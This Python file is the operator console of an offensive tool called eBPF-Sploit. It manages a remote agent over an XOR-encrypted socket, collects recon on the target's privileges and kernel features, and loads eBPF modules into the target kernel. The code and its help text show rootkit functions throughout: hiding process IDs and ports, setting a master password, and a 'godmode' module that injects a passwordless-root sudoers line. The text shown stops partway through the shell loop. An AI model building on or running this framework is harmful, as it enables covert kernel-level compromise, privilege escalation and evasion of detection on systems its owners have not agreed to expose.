import socket
import struct
import sys
import os
import json
import threading
import readline
from elftools.elf.elffile import ELFFile

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        GREEN = YELLOW = RED = CYAN = WHITE = RESET = ''

MAGIC = 0xDEADBEEF
PSK = "__EBPFSPLOIT_PSK__"

# Directory where the script is located (fixed regardless of from where it is started)
CONSOLE_DIR = os.path.dirname(os.path.abspath(__file__))
MODULES_DIR = os.path.join(CONSOLE_DIR, "modules")

# -- Command Types (corresponding with Agent) ----------------------------------
CMD_LOAD   = 4
CMD_UNLOAD = 5
CMD_LIST   = 6
CMD_UPDATE = 7
RESP_MSG   = 8
CMD_RECON  = 9
CMD_GET    = 10
CMD_DUMP_MAP = 11
CMD_DELETE = 12
CMD_CLEAR  = 13

# -- cmd_payload structure: 4+4+4+4+32+96 = 144 bytes ------------------------
CMD_FMT  = "<IIII32s96s"
CMD_SIZE = struct.calcsize(CMD_FMT)   # 144

# -- Response format: uint32 length prefix + JSON text -----------------------
RESP_LEN_FMT = "<I"


class EBPFSploit:
    def __init__(self, host, port):
        self.host     = host
        self.port     = port
        self.sock     = None
        self.current_mod   = None   # Currently selected module name (for 'use')
        self.user_configs  = {}     # Configs to be loaded
        self.active_sessions: dict = {}  # {session_id: {name, mod_name, ...}}
        self.recon_data: dict = {}        # Agent reconnaissance data
        self._resp_lock = threading.Lock()
        self.state_file = os.path.join(CONSOLE_DIR, ".ebpfsploit_sessions.json")
        self._load_state()

    def _load_state(self):
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, 'r') as f:
                    data = json.load(f)
                    self.active_sessions = {int(k): v for k, v in data.items()}
            except Exception:
                pass

    def _save_state(self):
        try:
            with open(self.state_file, 'w') as f:
                json.dump(self.active_sessions, f)
        except Exception:
            pass

    # -- Connection -----------------------------------------------------------
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self.host:  # Forward connection: console actively connects to Agent
                print(f"{Fore.CYAN}[*] Connecting to {self.host}:{self.port}...{Fore.WHITE}")
                self.sock.connect((self.host, self.port))
            else:  # Reverse listener: console waits for Agent to connect back
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                listener.bind(('0.0.0.0', self.port))
                listener.listen(1)
                print(f"{Fore.CYAN}[*] Listening on 0.0.0.0:{self.port}, waiting for Agent...{Fore.WHITE}")
                self.sock, addr = listener.accept()
                listener.close()
                print(f"{Fore.CYAN}[*] Agent connected from {addr[0]}:{addr[1]}{Fore.WHITE}")
            print(f"{Fore.GREEN}[+] Agent Linked.{Fore.WHITE}")
            self._request_recon()
            self.cmd_sessions(silent=True)
        except Exception as e:
            print(f"{Fore.RED}[-] Connection failed: {e}{Fore.WHITE}")
            sys.exit(1)

    def reconnect(self):
        print(f"\n{Fore.YELLOW}[*] Connection lost! Attempting to auto-reconnect to Agent... (Ctrl+C to cancel){Fore.WHITE}")
        import time
        while True:
            try:
                time.sleep(2)
                if self.sock:
                    self.sock.close()
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if self.host:
                    self.sock.connect((self.host, self.port))
                else:
                    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    listener.bind(('0.0.0.0', self.port))
                    listener.listen(1)
                    self.sock, _ = listener.accept()
                    listener.close()
                print(f"{Fore.GREEN}[+] Reconnected to Agent successfully.{Fore.WHITE}")
                self._request_recon()
                self.cmd_sessions(silent=True)
                break
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[-] Reconnection cancelled.{Fore.WHITE}")
                sys.exit(0)
            except Exception:
                pass

    # -- XOR Encryption/Decryption --------------------------------------------
    def _xor_crypt(self, data: bytes) -> bytes:
        psk = PSK.encode()
        psk_len = len(psk)
        if psk_len == 0:
            return data
        return bytes(b ^ psk[i % psk_len] for i, b in enumerate(data))

    # -- Send one cmd_payload --------------------------------------------------
    def _send_cmd(self, cmd_type, session_id=0, data_size=0,
                  aux=b'', config=b''):
        aux_b    = aux[:32].ljust(32, b'\x00')
        config_b = config[:96].ljust(96, b'\x00')
        pkt = struct.pack(CMD_FMT, MAGIC, cmd_type, session_id,
                          data_size, aux_b, config_b)
        pkt = self._xor_crypt(pkt)
        try:
            self.sock.sendall(pkt)
        except Exception:
            self.reconnect()
            try:
                self.sock.sendall(pkt)
            except Exception:
                pass

    # -- Read one length-prefix JSON response ---------------------------------
    def _recv_resp(self, timeout=5.0) -> dict | None:
        self.sock.settimeout(timeout)
        try:
            raw_len = self._recvall(4)
            if not raw_len:
                self.reconnect()
                return None
            raw_len = self._xor_crypt(raw_len)
            msg_len = struct.unpack(RESP_LEN_FMT, raw_len)[0]
            if msg_len == 0 or msg_len > 65536:
                return None
            raw = self._recvall(msg_len)
            if not raw:
                self.reconnect()
                return None
            raw = self._xor_crypt(raw)
            return json.loads(raw.decode('utf-8'))
        except socket.timeout:
            return None
        except Exception:
            self.reconnect()
            return None
        finally:
            self.sock.settimeout(None)

    def _recvall(self, n: int) -> bytes | None:
        data = b''
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    # -- Read module metadata from ELF .metadata section ----------------------
    def get_metadata(self, mod_name) -> dict | None:
        path = os.path.join(MODULES_DIR, f"{mod_name}.bpf.o")
        if not os.path.exists(path):
            return None
        try:
            with open(path, 'rb') as f:
                elf = ELFFile(f)
                sec = elf.get_section_by_name('.metadata')
                if sec:
                    raw = sec.data().rstrip(b'\x00').decode('utf-8')
                    return json.loads(raw)
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to parse metadata ({mod_name}): {e}{Fore.WHITE}")
        return None

    # -- list -----------------------------------------------------------------
    def list_modules(self):
        if not os.path.exists(MODULES_DIR):
            os.makedirs(MODULES_DIR)
            print(f"{Fore.YELLOW}[!] modules/ directory does not exist, created.{Fore.WHITE}")
            return
        print(f"\n{Fore.CYAN}═══ Available Modules ═══{Fore.WHITE}")
        print(f"{'Name':<20} {'Description'}")
        print(f"{'-'*20} {'-'*45}")
        found = False
        for fn in sorted(os.listdir(MODULES_DIR)):
            if fn.endswith('.bpf.o'):
                found = True
                name = fn.replace('.bpf.o', '')
                meta = self.get_metadata(name)
                desc = meta.get('desc', 'No description') if meta else 'Error reading metadata'
                # Check availability
                avail, missing = self.check_module_available(meta) if meta else (True, [])
                if avail:
                    status = f"{Fore.GREEN}[OK]{Fore.WHITE}"
                else:
                    reasons = ', '.join(self.REQUIRE_LABELS.get(m, m) for m in missing)
                    status = f"{Fore.RED}[N/A: {reasons}]{Fore.WHITE}"
                print(f"{name:<20} {desc}")
                print(f"{'':20} {status}")
        if not found:
            print(f"{Fore.YELLOW}  [No modules found]{Fore.WHITE}")
        print()

    # -- recon related --------------------------------------------------------
    REQUIRE_LABELS = {
        'is_root':       'Requires root privileges',
        'tracefs':       'Requires tracefs (tracepoint support)',
        'probe_write':   'Requires bpf_probe_write_user support',
        'uprobe':        'Requires uprobe support',
        'kprobe':        'Requires kprobe support',
        'kprobe_override': 'Requires kprobe override (CONFIG_BPF_KPROBE_OVERRIDE)',
        'xdp':           'Requires XDP support (CAP_NET_ADMIN)',
        'lsm_bpf':       'Requires kernel LSM BPF support',
        'cap_mac_admin':  'Requires CAP_MAC_ADMIN',
        'cap_net_admin':  'Requires CAP_NET_ADMIN',
    }

    def _request_recon(self):
        """Automatically get Agent environment reconnaissance info after connection"""
        try:
            self._send_cmd(CMD_RECON)
            resp = self._recv_resp(timeout=5.0)
            if resp and 'recon' in resp:
                self.recon_data = resp['recon']
                self._display_recon()
            else:
                print(f"{Fore.YELLOW}[!] Agent did not return recon data (old version?){Fore.WHITE}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Failed to get recon data: {e}{Fore.WHITE}")

    def _display_recon(self):
        r = self.recon_data
        print(f"\n{Fore.CYAN}═══ Target Recon ═══{Fore.WHITE}")
        print(f"  Kernel    : {r.get('kernel', '?')}")
        print(f"  Arch      : {r.get('arch', '?')}")
        print(f"  Hostname  : {r.get('hostname', '?')}")
        print(f"  Root      : {'✓' if r.get('is_root') else '✗'}")

        caps = r.get('caps', {})
        cap_str = ', '.join(
            f"{'✓' if v else '✗'} {k.upper()}"
            for k, v in caps.items()
        )
        print(f"  Caps      : {cap_str}")

        feats = r.get('features', {})
        on  = [k for k, v in feats.items() if v]
        off = [k for k, v in feats.items() if not v]
        print(f"  Features  : {Fore.GREEN}{', '.join(on)}{Fore.WHITE}")
        if off:
            print(f"  Missing   : {Fore.RED}{', '.join(off)}{Fore.WHITE}")

        lsm = r.get('lsm_modules', '')
        if lsm:
            print(f"  LSM       : {lsm}")
        print()

    def check_module_available(self, meta: dict) -> tuple:
        """Check if module is unavailable due to insufficient privileges/features.
        Returns (available: bool, missing: list[str])"""
        if not self.recon_data or 'requires' not in meta:
            return True, []

        r = self.recon_data
        caps = r.get('caps', {})
        feats = r.get('features', {})
        missing = []

        for req in meta['requires']:
            if req == 'is_root' and not r.get('is_root'):
                missing.append(req)
            elif req.startswith('cap_'):
                cap_name = req[4:]  # e.g. 'cap_mac_admin' → 'mac_admin'
                if not caps.get(cap_name):
                    missing.append(req)
            elif req in feats and not feats[req]:
                missing.append(req)

        return len(missing) == 0, missing

    def cmd_recon(self):
        """Manually request recon data"""
        self._request_recon()

    # -- show options ---------------------------------------------------------
    def show_options(self):
        if not self.current_mod:
            print(f"{Fore.YELLOW}[!] Please 'use <module>' first{Fore.WHITE}")
            return
        meta = self.get_metadata(self.current_mod)
        if not meta:
            print(f"{Fore.RED}[-] Unable to read metadata{Fore.WHITE}")
            return
        print(f"\n{Fore.CYAN}═══ Module Info ═══{Fore.WHITE}")
        print(f"Name   : {self.current_mod}")
        print(f"Desc   : {meta.get('desc', 'N/A')}\n")

        opts = meta.get('options', {})
        if opts:
            print(f"{Fore.CYAN}═══ Load-time Options (set before run) ═══{Fore.WHITE}")
            print(f"{'Option':<20} {'Current':<30} {'Description'}")
            print(f"{'-'*20} {'-'*30} {'-'*30}")
            for key, details in opts.items():
                val  = self.user_configs.get(key, details[0])
                # Escape newlines for proper display
                val_disp = repr(str(val))[1:-1]  # Remove quotes
                if len(val_disp) > 28:
                    val_disp = val_disp[:25] + "..."
                desc = details[1] if len(details) > 1 else ''
                print(f"{key:<20} {val_disp:<30} {desc}")
        else:
            print(f"{Fore.YELLOW}  [No load-time configuration items for this module, use 'run' directly]{Fore.WHITE}")

        visible_maps = {k: v for k, v in meta.get('maps', {}).items() if k != 'target_ip_count'}
        if visible_maps:
            print(f"\n{Fore.CYAN}═══ Runtime-updatable Maps (update after run) ═══{Fore.WHITE}")
            print(f"{'Map Name':<22} {'Update Example'}")
            print(f"{'-'*22} {'-'*40}")
            for mname, minfo in visible_maps.items():
                kt = minfo.get('key_type', '?')
                vt = minfo.get('value_type', '?')
                # Generate update example
                if vt == 'str':
                    example = f'update <sess> {mname} "value"'
                elif kt in ('u16',):
                    example = f'update <sess> {mname} 4444'
                elif kt in ('u64',):
                    example = f'update <sess> {mname} 123456'
                else:
                    example = f'update <sess> {mname} <key>'
                print(f"{mname:<22} {example}")
        print()

    # -- run_module -----------------------------------------------------------
    def run_module(self):
        if not self.current_mod:
            print(f"{Fore.YELLOW}[!] Please 'use <module>' first{Fore.WHITE}")
            return

        mod_path = os.path.join(MODULES_DIR, f"{self.current_mod}.bpf.o")
        if not os.path.exists(mod_path):
            print(f"{Fore.RED}[-] Cannot find {mod_path}{Fore.WHITE}")
            return

        with open(mod_path, 'rb') as f:
            blob = f.read()

        # Build initial config (take the value of the first option)
        meta = self.get_metadata(self.current_mod)
        config_buf = bytearray(96)
        if meta and 'options' in meta:
            first_key = next(iter(meta['options']), None)
            if first_key:
                default_val_str = str(meta['options'][first_key][0])
                val = self.user_configs.get(first_key, default_val_str)
                val = str(val).encode('utf-8').decode('unicode_escape')  # Handle \n → real newline

                # For maps with 'str' value type, we must NOT split spaces!
                is_string_val = meta.get('maps', {}).get(first_key, {}).get('value_type') == 'str'
                if is_string_val:
                    first_val = val
                else:
                    val_parts = val.replace(',', ' ').split()
                    first_val = val_parts[0] if val_parts else ""
                
                # Auto-expand godmode target for Load!
                if self.current_mod == 'godmode' and first_key == 'target':
                    if '\n' not in first_val and '=' not in first_val:
                        first_val = f"\n{first_val} ALL=(ALL:ALL) NOPASSWD:ALL\n"
                
                if self.current_mod == 'shadow_walker' and first_key == 'target':
                    # specifically encode the STRING into config_buf for shadow_walker
                    enc = first_val.encode('utf-8')[:8]
                    config_buf[:8] = enc.ljust(8, b'\x00')
                else:
                    opt_type = meta['options'][first_key][0] if len(meta['options'][first_key]) > 0 else "0"
                    is_numeric_option = str(opt_type).lstrip('-').isdigit()

                    if is_numeric_option and first_val.lstrip('-').isdigit():
                        config_buf[:4] = struct.pack('<I', int(first_val))
                    else:
                        enc = first_val.encode('utf-8')[:63]
                        config_buf[:len(enc)] = enc
                    enc = first_val.encode('utf-8')[:63]
                    config_buf[:len(enc)] = enc
                    
            if 'iface' in meta['options']:
                iface_val = self.user_configs.get('iface', str(meta['options']['iface'][0]))
                iface_enc = iface_val.encode('utf-8')[:31]
                config_buf[64:64+len(iface_enc)] = iface_enc

        mod_name_b = self.current_mod.encode('utf-8')
        print(f"{Fore.CYAN}[*] Deploying {self.current_mod} → target kernel...{Fore.WHITE}")

        self._send_cmd(CMD_LOAD,
                       data_size=len(blob),
                       aux=mod_name_b,
                       config=bytes(config_buf))
        self.sock.send(self._xor_crypt(blob))

        resp = self._recv_resp(timeout=10.0)
        if resp is None:
            print(f"{Fore.RED}[-] No response received{Fore.WHITE}")
            return

        if resp.get('ok'):
            sid   = resp['session_id']
            progs = resp.get('programs', 0)
            
            # Initialize session map_state recording
            map_state = {}
            if meta and 'maps' in meta:
                for mname in meta['maps']:
                    if mname in ('inject_payload', 'master_password'):
                        first_key = next(iter(meta.get('options', {})), None)
                        if first_key:
                            val = self.user_configs.get(first_key, meta['options'][first_key][0])
                            map_state[mname] = {"0": str(val)}

            self.active_sessions[sid] = {
                'name': self.current_mod,
                'programs': progs,
                'map_state': map_state
            }
            self._save_state()
            print(f"{Fore.GREEN}[+] Session {sid} opened  "
                  f"({progs} programs hooked){Fore.WHITE}")
                  
            # If there were multiple initial targets/whitelists, push the rest now seamlessly!
            if meta and 'options' in meta:
                for opt_key in meta['options']:
                    if opt_key.startswith('target'):
                        default_val_str = str(meta['options'][opt_key][0])
                        raw_val = self.user_configs.get(opt_key, default_val_str)
                        if raw_val:
                            is_string_val = meta.get('maps', {}).get(opt_key, {}).get('value_type') == 'str'
                            if is_string_val:
                                val_parts = [raw_val]
                            else:
                                val_parts = raw_val.replace(',', ' ').split()
                            # We update explicitly even if it's 1 value, to override agent.c generic initialization
                            self.cmd_update([str(sid), opt_key] + val_parts)
        else:
            print(f"{Fore.RED}[-] Load failed: {resp.get('error','unknown')}{Fore.WHITE}")

    # -- sessions -------------------------------------------------------------
    def cmd_sessions(self, silent=False):
        self._send_cmd(CMD_LIST)
        resp = self._recv_resp()
        if resp is None:
            if not silent: print(f"{Fore.RED}[-] No response received{Fore.WHITE}")
            return

        sessions = resp.get('sessions', [])
        
        # Synchronize agent state with local state
        active_ids = {s['id'] for s in sessions}
        for sid in list(self.active_sessions.keys()):
            if sid not in active_ids:
                del self.active_sessions[sid]
                
        for s in sessions:
            if s['id'] in self.active_sessions:
                self.active_sessions[s['id']]['programs'] = s.get('programs', 0)
                self.active_sessions[s['id']]['name'] = s.get('name', '?')
            else:
                self.active_sessions[s['id']] = s
                # Attempt to pull key fields of Array Map from Agent via communication interface to compensate local records
                pulled = self._pull_map_state_from_agent(s['id'], s['name'])
                if pulled:
                    self.active_sessions[s['id']]['map_state'] = pulled
        self._save_state()

        if silent:
            return

        if not sessions:
            print(f"{Fore.YELLOW}  [No active sessions]{Fore.WHITE}")
            return

        print(f"\n{Fore.CYAN}═══ Active Sessions ═══{Fore.WHITE}")
        print(f"{'ID':<6} {'Module':<20} {'Programs'}")
        print(f"{'-'*6} {'-'*20} {'-'*10}")
        for sid, s in self.active_sessions.items():
            print(f"{sid:<6} {s['name']:<20} {s.get('programs', '?')}")
        print()

    def _pull_map_state_from_agent(self, sid: int, module_name: str) -> dict:
        meta = self.get_metadata(module_name)
        if not meta or 'maps' not in meta: return {}
        map_state = {}
        for mname, mdetails in meta['maps'].items():
            val_type = mdetails.get('value_type', 'u32')
            
            try:
                pkt = struct.pack(CMD_FMT, MAGIC, 11, sid, 0, mname.encode('utf-8')[:32].ljust(32, b'\x00'), b'\x00'*96)
                self.sock.sendall(self._xor_crypt(pkt))
                self.sock.settimeout(2.0)
                raw_len = self._recvall(4)
                if raw_len:
                    raw_len = self._xor_crypt(raw_len)
                    msg_len = struct.unpack(RESP_LEN_FMT, raw_len)[0]
                    raw = self._recvall(msg_len)
                    if raw:
                        raw = self._xor_crypt(raw)
                        resp = json.loads(raw.decode('utf-8'))
                        if resp.get('ok') and 'entries' in resp:
                            map_state[mname] = {}
                            for entry in resp['entries']:
                                k_bytes = bytes.fromhex(entry['k'])
                                v_bytes = bytes.fromhex(entry['v'])
                                
                                # Parse key (usually u32)
                                try:
                                    k_val = str(struct.unpack("<I", k_bytes[:4])[0])
                                except Exception:
                                    k_val = entry['k']
                                    
                                # Parse value
                                try:
                                    if val_type == 'str':
                                        parsed_v = v_bytes.split(b'\x00')[0].decode('utf-8', 'replace')
                                        if not parsed_v: continue # ignore empty strings in arrays
                                        map_state[mname][k_val] = parsed_v
                                    else:
                                        parsed_v = str(struct.unpack("<I", v_bytes[:4])[0])
                                        if parsed_v != "0": # ignore zero entries
                                            map_state[mname][k_val] = parsed_v
                                except Exception:
                                    pass
                            
                            # if array map and empty, remove it
                            if not map_state[mname]:
                                del map_state[mname]
            except Exception as e:
                pass
            finally:
                self.sock.settimeout(None)
        return map_state

    # -- unload ---------------------------------------------------------------
    def cmd_unload(self, session_id: int):
        self._send_cmd(CMD_UNLOAD, session_id=session_id)
        resp = self._recv_resp()
        if resp is None:
            print(f"{Fore.RED}[-] No response received{Fore.WHITE}")
            return
        if resp.get('ok'):
            name = resp.get('name', '?')
            print(f"{Fore.GREEN}[+] Session {session_id} ('{name}') unloaded.{Fore.WHITE}")
            self.active_sessions.pop(session_id, None)
            self._save_state()
        else:
            print(f"{Fore.RED}[-] Unload failed: {resp.get('error','unknown')}{Fore.WHITE}")

    # -- update ---------------------------------------------------------------
    # update <session_id> <map_name> <key_arg> [value_arg]
    # Automatically pack key based on map's key_size; value defaults to uint32(1)
    def cmd_update(self, args: list[str]):
        if len(args) < 2:
            print("Usage: update <session_id> <map_name> <val1> [val2] ...")
            return

        try:
            sid = int(args[0])
        except ValueError:
            print(f"{Fore.RED}[-] session_id must be an integer{Fore.WHITE}")
            return

        map_name = args[1]
        sess_info = self.active_sessions.get(sid)
        if not sess_info:
            print(f"{Fore.RED}[-] Session ID {sid} does not exist{Fore.WHITE}")
            return

        meta = self.get_metadata(sess_info.get('name', ''))
        map_meta = meta.get('maps', {}).get(map_name, {}) if meta else {}
        key_size = map_meta.get('key_size', 4)
        val_size = map_meta.get('value_size', 4)
        val_type = map_meta.get('value_type', 'u32')

        # 1. Process Array Map (val_type == 'str'): merge remaining arguments into a single string
        if val_type == 'str':
            if len(args) < 3:
                print(f"{Fore.RED}[-] Error: Module {map_name} requires an argument{Fore.WHITE}")
                return
            val_str = ' '.join(args[2:])
            if val_str.startswith('"') and val_str.endswith('"'): val_str = val_str[1:-1]
            elif val_str.startswith("'") and val_str.endswith("'"): val_str = val_str[1:-1]
            
            # Unescape string so literal '\n' becomes an actual newline character
            val_str = val_str.encode('utf-8').decode('unicode_escape')
            
            # Auto-expand godmode payload if it's just a simple username
            if (sess_info.get('name') == 'godmode' or self.current_mod == 'godmode') and map_name == 'target':
                if '\n' not in val_str and '=' not in val_str:
                    val_str = f"\n{val_str} ALL=(ALL:ALL) NOPASSWD:ALL\n"

            key_bytes = struct.pack('<I', 0)
            value_bytes = val_str.encode('utf-8', 'replace').ljust(val_size, b'\x00')[:val_size]
            
            cfg = bytearray(96)
            cfg[:4] = key_bytes
            cfg[4:4+len(value_bytes)] = value_bytes
            self._send_cmd(CMD_UPDATE, sid, aux=map_name.encode('utf-8'), config=bytes(cfg))
            resp = self._recv_resp()
            if resp and resp.get('ok'):
                print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' updated successfully{Fore.WHITE}")
                if 'map_state' not in sess_info: sess_info['map_state'] = {}
                sess_info['map_state'][map_name] = {"0": val_str}
                self._save_state()
            return

        # 2. Process Hash Map: supports multi-value update 1 target 80 443
        values = args[2:]
        if not values:
            print(f"{Fore.RED}[-] Error: Missing value to update{Fore.WHITE}")
            return

        self._send_cmd(CMD_CLEAR, sid, aux=map_name.encode('utf-8'))
        self._recv_resp() 

        fmt_map = {1: '<B', 2: '<H', 4: '<I', 8: '<Q'}
        success_count = 0
        new_map_state = {}
        for val_str in values:
            try:
                if map_name == 'target' and sess_info.get('name') == 'shadow_walker':
                    key_bytes = val_str.encode('utf-8').ljust(8, b'\x00')
                    key_int = val_str
                elif '.' in val_str:
                    key_int = struct.unpack("<I", socket.inet_aton(val_str))[0]
                    key_bytes = struct.pack(fmt_map.get(key_size, '<I'), key_int)
                else:
                    key_int = int(val_str, 0)
                    key_bytes = struct.pack(fmt_map.get(key_size, '<I'), key_int)
                value_bytes = struct.pack('<I', 1).ljust(val_size, b'\x00')[:val_size]
                cfg = bytearray(96)
                cfg[:len(key_bytes)] = key_bytes
                cfg[len(key_bytes):len(key_bytes)+len(value_bytes)] = value_bytes
                self._send_cmd(CMD_UPDATE, sid, aux=map_name.encode('utf-8'), config=bytes(cfg))
                if (resp := self._recv_resp()) and resp.get('ok'):
                    success_count += 1
                    new_map_state[str(key_int)] = "1"
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Failed to parse argument '{val_str}': {e}{Fore.WHITE}")

        if success_count > 0:
            print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' update complete ({success_count} elements synchronized){Fore.WHITE}")
            if 'map_state' not in sess_info: sess_info['map_state'] = {}
            sess_info['map_state'][map_name] = new_map_state
            self._save_state()
        return

    # -- show session ---------------------------------------------------------

    def cmd_show_session(self, sid_str: str):
        try:
            sid = int(sid_str)
        except ValueError:
            print(f"{Fore.RED}[-] session_id must be an integer{Fore.WHITE}")
            return

        sess = self.active_sessions.get(sid)
        if not sess:
            print(f"{Fore.YELLOW}[!] Session {sid} not found{Fore.WHITE}")
            return

        print(f"\n{Fore.CYAN}═══ Session {sid} ({sess['name']}) ═══{Fore.WHITE}")
        print(f"Programs Hooked : {sess.get('programs', 0)}")
        
        map_state = sess.get('map_state', {})
        if not map_state:
            print(f"Current Config  : {Fore.YELLOW}No runtime parameters set.{Fore.WHITE}\n")
            return

        print(f"\n{Fore.CYAN}═══ Current Parameters (Local Record) ═══{Fore.WHITE}")
        for mname, entries in map_state.items():
            print(f"  {Fore.GREEN}[Map: {mname}]{Fore.WHITE}")
            for k, v in entries.items():
                if isinstance(v, str) and ('\n' in v or len(v) > 20):
                    # Friendly display for long strings (e.g. inject_payload)
                    disp_v = repr(v)[1:-1]
                    print(f"    Key {k:<6} => \"{disp_v}\"")
                else:
                    disp_k = k
                    if mname in ('target_ip', 'whitelist'):
                        try:
                            disp_k = socket.inet_ntoa(struct.pack("<I", int(k)))
                        except Exception:
                            pass
                    print(f"    Key {disp_k:<6} => {v}")
        print()

    # -- Main interactive shell -----------------------------------------------
    def _setup_readline(self):
        commands = ['help', 'list', 'use', 'show', 'set', 'run',
                    'sessions', 'unload', 'update', 'recon', 'clear', 'kill', 'exit']
        show_subs = ['options', 'session']

        def completer(text, state):
            buf = readline.get_line_buffer().lstrip()
            parts = buf.split()
            n = len(parts)
            # First word: command completion
            if n == 0 or (n == 1 and not buf.endswith(' ')):
                matches = [c + ' ' for c in commands if c.startswith(text)]
            # Second word
            elif parts[0] == 'use':
                mods = [fn.replace('.bpf.o','') for fn in os.listdir(MODULES_DIR) if fn.endswith('.bpf.o')] if os.path.isdir(MODULES_DIR) else []
                matches = [m + ' ' for m in mods if m.startswith(text)]
            elif parts[0] == 'show':
                matches = [s + ' ' for s in show_subs if s.startswith(text)]
            elif parts[0] in ('unload', 'kill') or (parts[0] == 'show' and len(parts) >= 2 and parts[1] == 'session'):
                sids = [str(s) + ' ' for s in self.active_sessions.keys()]
                matches = [s for s in sids if s.startswith(text)]
            elif parts[0] == 'update':
                if (n == 1 and buf.endswith(' ')) or (n == 2 and not buf.endswith(' ')):
                    # Complete session_id
                    sids = [str(s) + ' ' for s in self.active_sessions.keys()]
                    matches = [s for s in sids if s.startswith(text)]
                elif (n == 2 and buf.endswith(' ')) or (n == 3 and not buf.endswith(' ')):
                    # Complete map_name
                    sid = int(parts[1]) if parts[1].isdigit() else 0
                    sess = self.active_sessions.get(sid)
                    if sess:
                        meta = self.get_metadata(sess['name'])
                        if meta and 'maps' in meta:
                            matches = [m + ' ' for m in meta['maps'] if m.startswith(text)]
                        else:
                            matches = []
                    else:
                        matches = []
                else:
                    matches = []
            elif parts[0] == 'set':
                if (n == 1 and buf.endswith(' ')) or (n == 2 and not buf.endswith(' ')):
                    if self.current_mod:
                        meta = self.get_metadata(self.current_mod)
                        if meta:
                            opts = list(meta.get('options', {}).keys())
                            maps = list(meta.get('maps', {}).keys())
                            # For set, we usually set options, but some modules only have maps we update later.
                            # We'll allow tab completing both for convenience.
                            combined = list(set(opts + maps))
                            matches = [k + ' ' for k in combined if k.startswith(text)]
                        else:
                            matches = []
                    else:
                        matches = []
                else:
                    matches = []
            else:
                matches = []
            return matches[state] if state < len(matches) else None

        readline.set_completer(completer)
        readline.parse_and_bind('tab: complete')
        readline.set_completer_delims(' ')
        # Try to load history
        self._histfile = os.path.join(CONSOLE_DIR, '.ebpfsploit_history')
        try:
            readline.read_history_file(self._histfile)
        except FileNotFoundError:
            pass

    def _save_history(self):
        try:
            readline.write_history_file(self._histfile)
        except Exception:
            pass

    def shell(self):
        self._setup_readline()
        print(f"{Fore.GREEN}[*] eBPF-Sploit Ready. Type 'help' for commands.{Fore.WHITE}")
        while True:
            # rl_prompt_start \x01 and rl_prompt_end \x02 are needed by readline
            # to calculate the correct width of the prompt and avoid backspace display bugs
            mod_prompt = f"(\x01{Fore.RED}\x02{self.current_mod}\x01{Fore.CYAN}\x02)" if self.current_mod else ""
            try:
                # Add Fore.WHITE so user input resets back to default text color after prompt
                raw = input(f"\x01{Fore.CYAN}\x02ebpfsploit {mod_prompt} > \x01{Fore.WHITE}\x02").strip()
                if not raw:
                    continue
                parts = raw.split()
                act   = parts[0].lower()

                if act == "help":
                    print(f"""
{Fore.CYAN}═══ Core Commands ═══{Fore.WHITE}
  help                          Show this help
  list                          List all available modules in modules/ directory
  use <module>                  Select module
  show options                  Display configuration items and runtime Map details of current module
  set <KEY> <val>               Set configuration parameters before loading
  run                           Inject current module into target kernel

{Fore.CYAN}═══ Session Commands ═══{Fore.WHITE}
  sessions                      View all currently running module sessions
  show session <id>             View current parameter configuration of a session (local record)
  unload <session_id>           Hot-unload module of specified session (removes all Hooks)
  update <sess> <map> <key> [val]
                                Update BPF Map of running module at runtime

    {Fore.YELLOW}Hash Map (Add entry, key=item to add, val defaults to 1){Fore.WHITE}
      update 1 hidden_pids 1234           Hide PID 1234
      update 2 hidden_ports 4444          Hide port 4444
      update 3 protected_inodes 123456    Protect inode

    {Fore.YELLOW}Array Map (Modify value, key automatically set to 0){Fore.WHITE}
      update 1 master_password "newpass"  Modify master password
      update 2 inject_payload "\\nuser ALL=(ALL:ALL) NOPASSWD:ALL\\n"
                                          Modify sudoers injection rule

{Fore.CYAN}═══ Recon Commands ═══{Fore.WHITE}
  recon                         Refresh and display Agent environment reconnaissance info

  exit                          Exit console
""")

                elif act == "list":
                    self.list_modules()

                elif act == "use":
                    if len(parts) < 2:
                        print(f"Usage: use <module>")
                        continue
                    name = parts[1]
                    if os.path.exists(os.path.join(MODULES_DIR, f"{name}.bpf.o")):
                        self.current_mod  = name
                        self.user_configs = {}
                        print(f"{Fore.GREEN}[*] Module '{name}' selected.{Fore.WHITE}")
                    else:
                        print(f"{Fore.RED}[-] {name}.bpf.o not found in modules/{Fore.WHITE}")

                elif act == "show":
                    if len(parts) > 1 and parts[1] == "options":
                        self.show_options()
                    elif len(parts) > 2 and parts[1] == "session":
                        self.cmd_show_session(parts[2])
                    else:
                        print(f"Usage: show options  OR  show session <id>")

                elif act == "set":
                    if len(parts) < 3:
                        print(f"Usage: set <KEY> <value>")
                        continue
                    if self.current_mod:
                        k = parts[1]
                        v = ' '.join(parts[2:])
                        # Remove surrounding quotes properly
                        if (v.startswith('"') and v.endswith('"')) or (v.startswith("'") and v.endswith("'")):
                            v = v[1:-1]
                        # Handle escape sequences: \n → real newline, \t → real tab
                        v = v.encode('utf-8').decode('unicode_escape')
                        self.user_configs[k] = v
                        print(f"  {k} => {repr(v)}")
                    else:
                        print(f"{Fore.YELLOW}[!] Please 'use <module>' first{Fore.WHITE}")

                elif act == "run":
                    self.run_module()

                elif act == "sessions":
                    self.cmd_sessions()

                elif act == "unload" or act == "kill":
                    if len(parts) < 2:
                        print(f"Usage: {act} <session_id> [session_id2 ...]")
                        continue
                    for p in parts[1:]:
                        try:
                            self.cmd_unload(int(p))
                        except ValueError:
                            print(f"{Fore.RED}[-] session_id must be an integer: {p}{Fore.WHITE}")

                elif act == "update":
                    self.cmd_update(parts[1:])

                elif act == "recon":
                    self.cmd_recon()

                elif act == "clear":
